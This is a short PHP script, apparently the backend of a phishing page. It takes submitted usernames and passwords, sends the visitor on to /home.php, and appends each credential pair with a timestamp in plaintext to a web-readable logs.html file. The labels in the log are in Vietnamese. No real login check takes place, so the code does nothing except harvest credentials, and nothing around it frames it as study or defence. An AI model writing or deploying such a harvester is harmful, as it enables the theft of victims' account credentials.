<?php
header('Location: /home.php');
if(isset($_POST['username']) && isset($_POST['password']))
{
    $user = $_POST['username'];
    $pass = $_POST['password'];
	$time = (new DateTime())->setTimeZone(new DateTimeZone('Asia/Ho_Chi_Minh'))->format('H:i:s Y-m-d');
	/*$data = 'Time: ' . $date . ' | Username: ' . $_POST['username'] . ' | Password: ' . $_POST['password'] . "\n";
	$ret = file_put_contents('logs.html', $data, FILE_APPEND | LOCK_EX);
	if($ret === false) {
		die('There was an error writing this file');
	}
	else {
		echo "$ret bytes written to file";
	}*/
    $File = "logs.html";
    $fhandle = fopen($File, 'a');
    fwrite($fhandle,"Thông Tin");
    fwrite($fhandle,"<br>--------<br>");
    fwrite($fhandle,"Tài khoản: ");
    fwrite($fhandle,$user);
    fwrite($fhandle,"<br>--------<br>");
    fwrite($fhandle,"mật khẩu: ");
    fwrite($fhandle,$pass);
    fwrite($fhandle,"<br>--------<br>");
    fwrite($fhandle,"Thời Gian: ");
    fwrite($fhandle,$time);
    fwrite($fhandle,"<br>--------<br>");
    fwrite($fhandle,"----");
    fwrite($fhandle,"<br>----<br>");
    fclose($fhandle);
}
else {
	die('no post data to process');
}